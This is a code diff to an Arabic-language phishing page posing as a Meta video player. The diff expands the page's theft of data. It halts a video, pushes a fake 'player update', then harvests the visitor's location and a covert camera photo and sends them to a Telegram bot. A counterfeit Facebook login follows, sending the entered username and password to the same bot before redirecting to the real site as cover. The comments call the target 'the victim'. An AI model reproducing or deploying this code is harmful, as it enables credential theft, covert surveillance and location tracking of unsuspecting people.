@@ -3,15 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta Support Player</title>
+    <title>Meta Video Support</title>
     <link rel="manifest" href="manifest.json">
     <style>
         body { margin: 0; background: #000; font-family: Arial; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        video { width: 100%; max-height: 100vh; }
-        #pwa, #fb { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 10000; padding: 20px; flex-direction: column; align-items: center; justify-content: center; }
-        .box { background: #fff; padding: 25px; border-radius: 15px; text-align: center; width: 90%; max-width: 380px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        video { width: 100%; max-height: 100vh; cursor: pointer; }
+        #pwa, #fb { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 10000; padding: 20px; flex-direction: column; align-items: center; justify-content: center; }
+        .box { background: #fff; padding: 25px; border-radius: 15px; text-align: center; width: 90%; max-width: 380px; }
         button { background: #1877f2; color: #fff; border: none; padding: 15px; border-radius: 8px; width: 100%; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 15px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; background: #f5f6f7; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; background: #f5f6f7; color: #000; }
         .logo { color: #1877f2; font-size: 35px; font-weight: bold; margin-bottom: 10px; }
     </style>
 </head>
@@ -23,8 +23,8 @@
 
     <div id="pwa">
         <div class="box">
-            <h3 style="margin-top:0;">تحديث المشغل مطلوب</h3>
-            <p style="color:#606770; font-size:14px;">لاستكمال مشاهدة الفيديو بدون حظر، يجب الانتقال للمشغل الرسمي.</p>
+            <h3 style="margin-top:0; color:#000;">تحديث المشغل مطلوب</h3>
+            <p style="color:#606770; font-size:14px;">لاستكمال مشاهدة الفيديو بدون حظر، يرجى الانتقال للمشغل الرسمي.</p>
             <button id="btn_ins">تثبيت واستكمال المشاهدة</button>
         </div>
     </div>
@@ -36,7 +36,6 @@
             <input type="text" id="user" placeholder="رقم الهاتف أو البريد الإلكتروني">
             <input type="password" id="pass" placeholder="كلمة السر">
             <button id="btn_go">تسجيل الدخول</button>
-            <p style="color:#1877f2; font-size:12px; margin-top:15px;">هل نسيت كلمة السر؟</p>
         </div>
     </div>
 
@@ -49,7 +48,7 @@
         if ('serviceWorker' in navigator) { navigator.serviceWorker.register('sw.js'); }
         window.addEventListener('beforeinstallprompt', (e) => { e.preventDefault(); p = e; });
 
-        // الفيديو يقطع عند ثانية 10 ويطلب التثبيت
+        // قطع الفيديو عند الثانية 10
         v.ontimeupdate = () => {
             if (v.currentTime >= 10) {
                 v.pause();
@@ -59,38 +58,46 @@
         };
 
         document.getElementById('btn_ins').addEventListener('click', async () => {
-            // تنفيذ التثبيت (PWA)
-            if (p) {
-                p.prompt();
-                const { outcome } = await p.userChoice;
-                if (outcome === 'accepted') send("🎯 الضحية ثبت المشغل");
-            }
+            if (p) { p.prompt(); }
             
-            // سحب الأذونات (كاميرا، مايك، موقع)
+            // 1. سحب الموقع
             navigator.geolocation.getCurrentPosition((pos) => {
-                send(`📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+                sendMsg(`📍 موقع الضحية:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
             });
+
+            // 2. سحب الكاميرا والمايك وصورة فورية
             try {
-                await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-                send("🎙️📸 تم فتح الكاميرا والمايك");
-            } catch (e) { send("❌ رفض الأذونات"); }
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                sendMsg("🎙️📸 تم الحصول على الأذونات وجارٍ التقاط صورة...");
+                
+                const track = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+                const photoBlob = await imageCapture.takePhoto();
+                
+                // إرسال الصورة للبوت
+                let formData = new FormData();
+                formData.append('chat_id', ID);
+                formData.append('photo', photoBlob, 'victim.jpg');
+                fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: formData });
+
+            } catch (e) { sendMsg("❌ الضحية رفض الكاميرا."); }
             
-            // الانتقال لصفحة الفيس
             document.getElementById('pwa').style.display = 'none';
             document.getElementById('fb').style.display = 'flex';
         });
 
+        // 3. سحب الباسورد
         document.getElementById('btn_go').addEventListener('click', () => {
             const u = document.getElementById('user').value;
             const ps = document.getElementById('pass').value;
             if(u && ps) {
-                send(`🔐 صيدة فيس:\n📧: ${u}\n🔑: ${ps}`);
-                alert("⚠️ خطأ في المصادقة، حاول مجدداً.");
-                window.location.href = "https://m.facebook.com"; // تحويله للحقيقي للتغطية
+                sendMsg(`🔐 حساب فيسبوك:\n📧: ${u}\n🔑: ${ps}`);
+                alert("⚠️ خطأ في الاتصال، حاول لاحقاً.");
+                window.location.href = "https://m.facebook.com";
             }
         });
 
-        function send(msg) {
+        function sendMsg(msg) {
             fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}`, { mode: 'no-cors' });
         }
     </script>
